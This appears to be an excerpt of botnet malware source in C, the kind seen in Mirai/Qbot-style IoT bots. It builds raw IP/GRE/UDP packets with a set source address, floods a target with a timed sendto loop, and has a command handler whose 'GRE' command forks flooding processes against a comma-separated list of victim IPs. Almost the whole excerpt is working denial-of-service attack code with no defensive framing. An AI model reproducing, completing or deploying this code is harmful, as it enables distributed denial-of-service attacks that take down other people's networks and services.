...
struct grehdr {
    uint16_t flags_and_version; // Usually 0x2000 or 0x0000
    uint16_t protocol_type;     // Set to 0x0800 for IPv4
};
...
void send_gre_udp_packets(const char *dst_ip, int port, int packetsize, int secs) {
    ...
    struct udphdr *udph = (struct udphdr *) (packet + sizeof(struct iphdr) + sizeof(struct grehdr));
    char *data = (char *)(packet + sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct udphdr));

    memset(packet, 0, sizeof(packet));
    memset(data, 'A', packetsize);

    // Fill IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct udphdr) + packetsize);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_GRE;
    iph->saddr = inet_addr("192.168.1.100"); // Change as needed
    iph->daddr = inet_addr(dst_ip);
    iph->check = csum((unsigned short *) packet, sizeof(struct iphdr) / 2);

    // Fill GRE header
    gre->flags_and_version = htons(0x2000);
    gre->protocol_type = htons(0x0800); // IPv4
...
void send_packets(unsigned char *ip, int port,  int secs, int packetsize) {
    ...
    memset(packet, 'A', packetsize);  // Fill with dummy data

    time_t start = time(NULL);
    while (time(NULL) - start < secs) {
        sendto(sock, packet, packetsize, 0, (struct sockaddr *)&target, sizeof(target));
    }
...
void processCmd(int argc, unsigned char *argv[])
{
    ...
    if (!strcmp(argv[0], "GRE")) {
        ...
        if (strstr((char *)ip, ",") != NULL) {
            ...
            while (hi != NULL) {
                if (!listFork()) {
                    send_gre_udp_packets((char *)hi, port, packetsize, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
            ...
            if (listFork()) return;
            send_gre_udp_packets((char *)ip, port, packetsize, time);
            _exit(0);
        }
    }
    // -------------------------------------------------------------------
